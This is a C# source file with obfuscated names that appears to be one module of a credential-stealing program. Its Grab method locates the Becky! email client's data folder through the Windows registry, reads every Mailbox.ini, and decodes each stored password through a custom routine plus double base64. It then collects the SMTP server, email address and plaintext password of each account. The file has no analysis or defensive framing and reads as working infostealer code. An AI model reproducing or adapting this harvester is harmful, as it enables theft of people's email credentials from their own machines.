using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using C6Zy;
using Microsoft.Win32;
using rCOGWW;
using reJu9lk2r;

namespace rk937aHHc
{
	public class Becky : EtbH
	{
		public Becky()
		{
			this.xuhYZ = "Becky!";
		}

		public string xuhYZ { get; set; }

        public List<WTitxI2m> Grab()
        {
            List<WTitxI2m> list = new List<WTitxI2m>();
            string dataDir = null;

            try
            {
                dataDir = (string)Registry.GetValue(
                    "HKEY_CURRENT_USER\\Software\\RimArts\\B2\\Settings",
                    "DataDir", "");

                if (string.IsNullOrEmpty(dataDir))
                    return list;
            }
            catch
            {
                return list;
            }

            string folderListPath = dataDir + "Folder.lst";
            if (!File.Exists(folderListPath))
                return list;

            List<string> folders = new List<string>();
            foreach (string folder in File.ReadAllLines(folderListPath))
            {
                folders.Add(dataDir + folder);
            }

            foreach (string folderPath in folders)
            {
                if (!Directory.Exists(folderPath))
                    continue;

                try
                {
                    string mailboxPath = folderPath + "\\Mailbox.ini";
                    if (!File.Exists(mailboxPath))
                        continue;

                    w3uoxlrf mailbox = new w3uoxlrf(mailboxPath);

                    string passwordBase64 = mailbox["Account"]["PassWd"];
                    string password = Encoding.Default.GetString(
                        Convert.FromBase64String(
                            Encoding.Default.GetString(
                                Convert.FromBase64String(
                                    eha4ad2F.h5FmNC(passwordBase64, 2)))));

                    WTitxI2m account = new WTitxI2m
                    {
                        data1 = mailbox["Account"]["SMTPServer"],
                        data2 = mailbox["Account"]["MailAddress"],
                        data3 = password,
                        data4 = "Becky!"
                    };

                    if (!string.IsNullOrEmpty(account.data2) && !string.IsNullOrEmpty(account.data3))
                    {
                        list.Add(account);
                    }
                }
                catch
                {
                }
            }

            return list;
        }
    }
}
